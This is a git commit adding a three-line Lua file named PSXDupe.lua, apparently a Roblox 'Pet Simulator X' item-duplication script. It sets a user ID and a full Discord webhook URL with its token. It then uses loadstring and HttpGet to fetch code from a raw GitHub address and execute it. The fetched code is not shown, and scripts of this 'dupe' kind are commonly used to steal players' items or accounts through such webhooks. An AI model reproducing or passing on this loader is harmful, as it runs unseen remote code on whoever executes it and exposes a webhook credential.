a96a1a2b2a835897b27d67cf448a914e81a6f294
Alinushh412312 <121054456+Alinushh412312@users.noreply.github.com>
2022-12-19 21:04:05 +0200

    Add files via upload

---
+++ PSXDupe.lua
@@ -0,0 +1,3 @@
+_G.UserID = 985888510
+_G.WebHook = "https://discord.com/api/webhooks/1054473264413552680/yxBFZur5gXaB2SVehiO9CH23swrtoFUinOZA3GDWCUkqG3p_VVpjjgbXJFKTBqB5vfMf"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true"))()
